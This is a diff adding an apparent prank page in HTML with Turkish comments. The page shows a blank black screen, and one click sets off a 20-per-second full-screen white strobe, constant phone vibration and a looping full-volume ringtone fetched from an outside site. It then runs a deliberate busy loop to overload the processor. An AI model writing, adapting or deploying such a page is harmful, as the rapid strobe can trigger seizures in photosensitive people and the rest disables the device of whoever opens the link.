@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> </title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000000;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: pointer;
+        }
+        #flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: none;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body onclick="startChaos()">
+
+<div id="flash"></div>
+
+<script>
+    let flashInterval;
+    let isRunning = false;
+
+    function toggleFlash() {
+        const flashDiv = document.getElementById('flash');
+        flashInterval = setInterval(() => {
+            flashDiv.style.display = flashDiv.style.display === 'none' ? 'block' : 'none';
+        }, 50);
+    }
+
+    function startChaos() {
+        if (isRunning) return;
+        isRunning = true;
+
+        // 1. Flaş patlasın
+        toggleFlash();
+
+        // 2. Titreşim başlasın
+        if (navigator.vibrate) {
+            navigator.vibrate([1000, 50, 1000, 50, 1000, 50, 1000]);
+            setInterval(() => {
+                navigator.vibrate([1000, 50, 1000]);
+            }, 2000);
+        }
+
+        // 3. GERÇEK GALAXY S10 "OVER THE HORIZON" MP3 LİNKİ
+        const audio = new Audio('https://www.allringtone.com/download/ringtone/samsung-galaxy-s10-over-the-horizon_33355_mp3');
+        audio.loop = true;
+        audio.volume = 1.0; 
+
+        audio.play().then(() => {
+            console.log("Müzik çalıyor!");
+            
+            // 4. Müzik başladıktan sonra işlemciyi kastırma döngüsü
+            setTimeout(() => {
+                setInterval(() => {
+                    for (let i = 0; i < 4000000; i++) {
+                        Math.sqrt(Math.sin(Math.random()));
+                    }
+                }, 100);
+            }, 1000);
+
+        }).catch(e => {
+            console.log("Oynatma hatası: ", e);
+        });
+    }
+</script>
+
+</body>
+</html>
